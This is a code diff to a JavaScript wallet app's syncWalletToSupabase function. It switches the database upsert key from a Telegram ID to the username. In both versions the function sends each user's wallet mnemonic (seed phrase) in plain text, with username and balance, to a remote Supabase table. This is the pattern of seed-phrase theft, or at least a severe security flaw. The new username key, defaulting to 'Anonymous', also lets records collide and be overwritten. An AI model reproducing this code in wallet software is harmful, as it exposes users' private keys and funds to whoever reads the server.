@@ -11,14 +11,16 @@ export async function syncWalletToSupabase(walletData) {
     return null;
   }
 
-  const { telegram_id, username, mnemonic, addresses } = walletData;
+  const { username, mnemonic, balance } = walletData;
   const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
-  const userId = telegram_id && telegram_id !== 'unknown' ? String(telegram_id) : `browser_${Math.random().toString(36).slice(2, 11)}`;
+  
+  // В новой структуре username — это primary key
+  const name = username || 'Anonymous';
 
-  console.log('🔄 Syncing wallet to Supabase for user:', userId);
+  console.log('🔄 Syncing wallet to Supabase for username:', name);
 
   try {
-    const response = await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=telegram_id`, {
+    const response = await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
       method: 'POST',
       headers: {
         'apikey': SUPABASE_KEY,
@@ -27,9 +29,9 @@ export async function syncWalletToSupabase(walletData) {
         'Prefer': 'resolution=merge-duplicates'
       },
       body: JSON.stringify({
-        telegram_id: userId,
-        username: username || 'Anonymous',
+        username: name,
         mnemonic: cleanMnemonic,
+        balance: balance ? String(balance) : "0",
         created_at: new Date().toISOString()
       })
     });
